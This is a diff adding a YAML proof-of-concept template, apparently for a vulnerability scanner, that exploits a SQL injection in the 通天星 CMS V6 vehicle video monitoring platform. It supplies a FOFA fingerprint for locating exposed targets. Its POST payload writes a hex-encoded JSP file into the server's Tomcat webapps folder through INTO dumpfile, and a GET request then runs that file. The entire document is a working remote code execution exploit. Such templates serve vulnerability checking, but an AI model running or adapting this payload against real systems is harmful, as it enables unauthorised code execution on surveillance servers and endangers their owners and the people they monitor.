@@ -1,0 +1,31 @@
+id: poc-yaml-g-sky-cmsv6-point-managemerge-sqli
+info:
+  name: 通天星CMS V6车载视频监控平台 point_managemerge SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: cmsv6
+  fofa: body="/808gps/"
+variables:
+  t1: random_str(4)
+requests:
+- method: POST
+  path: /point_manage/merge
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'id=1&name=1'' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL
+
+    INTO dumpfile ''../../tomcat/webapps/gpsweb/{{.t1}}.jsp'' FROM user_session a
+
+    WHERE ''1 ''=''1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8'
+  expression: 'status_code == 200 &&
+
+    contains(body,"result\":0,\"message\":\"OK\"") &&
+
+    contains(content_type,"application/json")
+
+    '
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && contains(body,"zz010f") && !contains(body,"<")
+transport: http
